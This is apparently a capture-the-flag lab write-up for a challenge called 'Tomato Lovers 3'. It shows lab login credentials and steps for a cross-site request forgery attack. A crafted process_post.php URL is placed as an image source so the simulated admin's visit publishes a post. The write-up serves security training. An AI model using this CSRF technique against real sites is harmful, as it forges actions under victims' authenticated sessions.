# Challenge #1 - Tomato Lovers 3

## Credentials

Username: tom
Password: tomtom

## Objectives

- You have to exploit a CSRF vulnerability present in the web application.
- You are required to build an exploit so that a new blog post, authored by "Admin," will appear on the blogs page as soon as the Admin visits the blogs page (so just admin's visit to a page will trigger the exploit and make an embarrassing blog post appear).
- You do not know Admin's credentials, and you do not have to find it.
- A CSRF payload can be triggered by having the victim surreptitiously issue an HTTP request that performs some action on his behalf "riding" his authenticated session.
- As soon as you have built your payload, you can simulate an authenticated visit of the Admin to the blogs page by clicking the link that you find on the top right of the Blogs page.
- If you manage to have the Admin post a message, you will find the secret within the blog post.

## Steps

With borp enable, login the system and send a publish a blog post. On burp history search for the process_post.php request. Copy the request url with the parameters.

```
http://1.challenge.session.site/process_post.php?title=example&body=body&pic=http%3A%2F%2Fexample.com
```

Change the content of the post.

Url:
```
http://1.challenge.session.site/process_post.php?title=hacked&body=hacked&pic=http%3A%2F%2Fhacker.com
```

Now create a new post with this url as pic url.

Click to simulate the admin. The admin will click on the link and, by this, create a new post using their credentials.